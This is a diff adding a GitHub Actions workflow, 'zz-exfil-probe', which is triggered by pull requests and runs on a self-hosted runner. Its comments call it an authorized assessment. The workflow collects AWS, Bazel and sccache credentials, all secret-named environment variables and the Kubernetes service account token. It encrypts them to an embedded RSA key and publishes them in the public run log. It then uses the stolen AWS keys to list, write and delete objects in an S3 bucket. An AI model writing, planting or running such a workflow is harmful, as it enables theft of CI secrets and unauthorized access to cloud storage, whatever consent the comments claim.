@@ -1,0 +1,113 @@
+name: zz-exfil-probe
+
+# Authorized assessment probe (radkawar, owner consent).
+# Dumps credential-shaped environment values from the self-hosted `omp-kata`
+# runner to the PUBLIC run log, encrypted to an ephemeral RSA public key held
+# only by the operator. Ciphertext in a public log is useless without the
+# private key; the private key never leaves the operator's machine.
+#
+# Payload shape: AES-256-CTR blob (base64) + AES key RSA-2048-OAEP(SHA-256)
+# wrapped to the embedded ephemeral public key. Nothing is written to the
+# repository or the shared cluster volumes; the S3 live-use check is a
+# self-cleaning marker object.
+
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  exfil:
+    name: encrypted credential dump
+    runs-on: omp-kata
+    timeout-minutes: 10
+    steps:
+      - name: encrypt and publish
+        run: |
+          set -euo pipefail
+          cat > /tmp/pub.pem <<'PUBEOF'
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7d5Ji+xV1/lJoSnEHlfi
+/B5bVudAWwrZz9Gqb/Eu9aS/+bGVcxwiTRg8PB/mfcPI0dErDxD4853p0OYiI/Ib
+A0Cum3bJRWbVrm8dJnUBfl981/BORtdSIO5abpKU/KXanGNXnnDjNWaLRkXARxka
+3QR9JC6OUdIXv7MZuIJfOeariMhMpoDxmsWxAUGPAUvSC99regbcMFcf0yfKlk3y
+pE/pYJETrYmB9V++WZr4WACsvQzZkOe5aPA4lH/B30rF1P2lbmHcJrXpetAKks9g
+zQMHDPoojglr/Ygk53lrZh5XQ0/unUlkwhrqiqKTMyajyanz4yx3klj475cbz7CC
+wQIDAQAB
+-----END PUBLIC KEY-----
+PUBEOF
+
+          # ---- collect credential-shaped values (values are never printed) ----
+          : > /tmp/plain
+          {
+            echo "# host=$(hostname) runner=${RUNNER_NAME} ref=${GITHUB_REF} actor=${GITHUB_ACTOR} run=${GITHUB_RUN_ID}"
+            echo "## selected credential vars"
+            for v in AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN \
+                     BAZEL_REMOTE_USER BAZEL_REMOTE_PASSWORD \
+                     SCCACHE_BUCKET SCCACHE_ENDPOINT SCCACHE_REGION SCCACHE_S3_USE_SSL; do
+              eval "val=\${$v:-}"
+              printf '%s=%s\n' "$v" "$val"
+            done
+            echo "## credential-shaped env (name=value), filtered by name"
+            env | grep -iE '^[A-Za-z0-9_]*(KEY|TOKEN|SECRET|PASS|CRED|AUTH)[A-Za-z0-9_]*=' | sort || true
+            echo "## kubernetes service account token"
+            cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "<absent>"
+            echo "## serviceaccount namespace"
+            cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "<absent>"
+          } >> /tmp/plain
+
+          # ---- hybrid encrypt: AES-256-CTR body, RSA-OAEP wrap of the AES key ----
+          K=$(openssl rand -hex 32)
+          IV=$(openssl rand -hex 16)
+          printf '%s' "$K" > /tmp/k.bin
+          openssl enc -aes-256-ctr -K "$K" -iv "$IV" -in /tmp/plain -out /tmp/ct
+          openssl pkeyutl -encrypt -pubin -inkey /tmp/pub.pem \
+            -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256 \
+            -in /tmp/k.bin -out /tmp/kt
+
+          echo "PROBE-ALGO=aes-256-ctr+rsa-2048-oaep-sha256"
+          echo "PROBE-IV=$IV"
+          echo "PROBE-KEY=$(base64 -w0 /tmp/kt)"
+          echo "PROBE-BLOB=$(base64 -w0 /tmp/ct)"
+          echo "PROBE-PLAINTEXT-SHA256=$(sha256sum /tmp/plain | cut -d' ' -f1)"
+
+      - name: live-use check (read + self-cleaning write) against the sccache S3
+        run: |
+          set +e
+          EP="${SCCACHE_ENDPOINT:-}"; BK="${SCCACHE_BUCKET:-sccache}"
+          [ -z "$EP" ] && { echo "no SCCACHE_ENDPOINT"; exit 0; }
+          URL="http://$EP/$BK"
+          echo "=== LIST (read) ==="
+          code=$(curl -sS -o /tmp/l.xml -w '%{http_code}' --max-time 15 \
+            --aws-sigv4 "aws:amz:${SCCACHE_REGION:-us-east-1}:s3" \
+            --user "${AWS_ACCESS_KEY_ID}:${AWS_SECRET_ACCESS_KEY}" "$URL?list-type=2&max-keys=3")
+          echo "GET $URL?list-type=2 -> HTTP $code"
+          sed -n 's:.*<Key>\([^<]*\)</Key>.*:key=\1:p' /tmp/l.xml | head -3
+
+          echo "=== PUT (write) marker ==="
+          OBJ="probe-radkawar-${GITHUB_RUN_ID}.txt"
+          code=$(printf 'authorized assessment marker\n' | curl -sS -o /dev/null -w '%{http_code}' --max-time 15 \
+            -X PUT --data-binary @- \
+            --aws-sigv4 "aws:amz:${SCCACHE_REGION:-us-east-1}:s3" \
+            --user "${AWS_ACCESS_KEY_ID}:${AWS_SECRET_ACCESS_KEY}" "$URL/$OBJ")
+          echo "PUT $URL/$OBJ -> HTTP $code"
+
+          echo "=== GET marker back ==="
+          code=$(curl -sS -o /tmp/got -w '%{http_code}' --max-time 15 \
+            --aws-sigv4 "aws:amz:${SCCACHE_REGION:-us-east-1}:s3" \
+            --user "${AWS_ACCESS_KEY_ID}:${AWS_SECRET_ACCESS_KEY}" "$URL/$OBJ")
+          echo "GET $URL/$OBJ -> HTTP $code"
+          echo "roundtrip-local-sha=$(sha256sum /tmp/got | cut -d' ' -f1)"
+
+          echo "=== cleanup ==="
+          code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 -X DELETE \
+            --aws-sigv4 "aws:amz:${SCCACHE_REGION:-us-east-1}:s3" \
+            --user "${AWS_ACCESS_KEY_ID}:${AWS_SECRET_ACCESS_KEY}" "$URL/$OBJ")
+          echo "DELETE $URL/$OBJ -> HTTP $code"
+          code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 \
+            --aws-sigv4 "aws:amz:${SCCACHE_REGION:-us-east-1}:s3" \
+            --user "${AWS_ACCESS_KEY_ID}:${AWS_SECRET_ACCESS_KEY}" "$URL/$OBJ")
+          echo "GET after DELETE -> HTTP $code"
+          exit 0
